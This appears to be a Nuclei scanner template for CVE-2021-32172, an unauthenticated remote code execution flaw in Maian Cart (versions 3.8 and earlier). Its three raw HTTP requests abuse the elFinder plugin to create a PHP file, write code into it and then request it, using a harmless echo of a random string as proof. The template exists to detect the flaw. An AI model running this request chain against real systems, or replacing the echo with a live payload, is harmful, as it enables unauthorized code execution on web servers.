http:
- extractors:
  - group: 1
    internal: true
    name: hash
    regex:
    - '"hash"\:"(.*?)"\,'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(body_3, "{{randstr_1}}")
    - status_code_3 == 200
    type: dsl
  raw:
  - 'GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  - 'POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, /; q=0.01

    Accept-Language: en-US,en;q=0.5

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{{randstr_1}}%22%3b%20%3f%3e

    '
  - 'GET /product-downloads/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
id: CVE-2021-32172
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:maianscriptworld:maian_cart:3.8:*:*:*:*:*:*:*
    cve-id: CVE-2021-32172
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.98623
    epss-score: 0.70441
  description: Maian Cart 3.0 to 3.8 via the elFinder file manager plugin contains
    a remote code execution vulnerability.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 3
    product: maian_cart
    vendor: maianscriptworld
  name: Maian Cart <=3.8 - Remote Code Execution
  reference:
  - https://dreyand.github.io/maian-cart-rce/
  - https://github.com/DreyAnd/maian-cart-rce
  - https://www.maianscriptworld.co.uk/critical-updates
  - https://nvd.nist.gov/vuln/detail/CVE-2021-32172
  - https://www.maianscriptworld.co.uk/
  remediation: 'Upgrade to a patched version of Maian Cart (>=3.8) to mitigate this
    vulnerability.

    '
  severity: critical
  tags: cve2021,cve,rce,unauth,maian,intrusive,maianscriptworld,vkev,vuln
